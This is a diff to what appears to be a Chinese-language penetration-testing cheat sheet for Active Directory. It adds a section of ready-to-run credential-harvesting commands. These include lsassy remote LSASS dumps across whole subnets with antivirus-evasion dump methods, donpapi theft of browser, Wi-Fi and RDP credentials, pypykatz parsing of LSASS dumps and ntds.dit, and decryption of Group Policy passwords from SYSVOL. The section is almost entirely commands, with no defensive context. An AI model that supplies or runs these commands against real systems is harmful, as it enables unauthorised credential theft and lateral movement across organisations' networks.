@@ -97,3 +97,58 @@ impacket-getTGT DOMAIN/USER -hashes :NTLM_HASH -dc-ip DC_IP
 export KRB5CCNAME=USER.ccache
 impacket-psexec -k -no-pass DOMAIN/USER@TARGET
 ```
+
+## 远程凭据收割工具
+
+### lsassy — 远程 LSASS 凭据提取
+```bash
+# 远程导出 LSASS（无需 RDP/交互式登录）
+lsassy -d DOMAIN -u USER -p PASSWORD TARGET
+lsassy -d DOMAIN -u USER -H NTLM_HASH TARGET
+
+# 批量提取（整个网段）
+lsassy -d DOMAIN -u USER -p PASSWORD 10.0.0.0/24
+
+# 指定导出方式（规避 AV）
+lsassy -d DOMAIN -u USER -p PASSWORD TARGET -m comsvcs
+lsassy -d DOMAIN -u USER -p PASSWORD TARGET -m nanodump
+```
+
+### donpapi — DPAPI 凭据收割
+```bash
+# 收割目标机器上的 DPAPI 保护凭据（浏览器密码、Wi-Fi、RDP、证书等）
+donpapi DOMAIN/USER:PASSWORD@TARGET
+donpapi DOMAIN/USER@TARGET -hashes :NTLM_HASH
+
+# 批量收割
+donpapi DOMAIN/USER:PASSWORD@TARGET1 DOMAIN/USER:PASSWORD@TARGET2
+
+# 指定输出目录
+donpapi DOMAIN/USER:PASSWORD@TARGET -output-dir /tmp/dpapi_loot
+```
+
+### pypykatz — 本地 LSASS dump 离线分析
+```bash
+# 解析本地 lsass dump 文件
+pypykatz lsa minidump lsass.dmp
+
+# 解析注册表 hive（SAM/SYSTEM/SECURITY）
+pypykatz registry --sam SAM --system SYSTEM --security SECURITY
+
+# 从 AD 数据库提取凭据
+pypykatz lsa nt /path/to/ntds.dit -system SYSTEM
+```
+
+### gpp-decrypt — 组策略密码解密
+```bash
+# 解密 Groups.xml 中的 cpassword（GPP 密码）
+gpp-decrypt "ENCRYPTED_CPASSWORD"
+
+# 常见 GPP 密码文件路径
+# \\DOMAIN\SYSVOL\DOMAIN\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml
+# \\DOMAIN\SYSVOL\DOMAIN\Policies\{GUID}\Machine\Preferences\Services\Services.xml
+# \\DOMAIN\SYSVOL\DOMAIN\Policies\{GUID}\Machine\Preferences\Scheduledtasks\Scheduledtasks.xml
+
+# 自动搜索 SYSVOL 中的 GPP 密码
+netexec smb DC_IP -u USER -p PASSWORD -M gpp_password
+```
